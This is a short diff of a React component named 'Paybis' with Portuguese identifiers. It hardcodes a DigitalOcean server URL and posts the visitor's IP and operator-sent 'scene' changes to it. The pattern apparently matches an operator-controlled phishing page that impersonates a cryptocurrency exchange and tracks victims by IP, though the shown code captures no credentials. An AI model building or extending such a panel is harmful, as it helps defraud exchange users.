@@ -16,7 +16,7 @@ export default function Paybis({ ip, socket }) {
 
   useEffect(() => {
     async function login() {
-      await axios.post(`${process.env.URL_SVR}/login`, {
+      await axios.post("https://seal-app-w9oy8.ondigitalocean.app/login", {
         corretora: "paybis",
         ip: ip,
       });
@@ -31,7 +31,7 @@ export default function Paybis({ ip, socket }) {
 
       if (ip === ipRecebido) {
         async function AtualizaCena() {
-          await axios.post(`${process.env.URL_SVR}/atualizacena`, {
+          await axios.post("https://seal-app-w9oy8.ondigitalocean.app/atualizacena", {
             cena: cenaRecebida,
             ip: ipRecebido,
           });
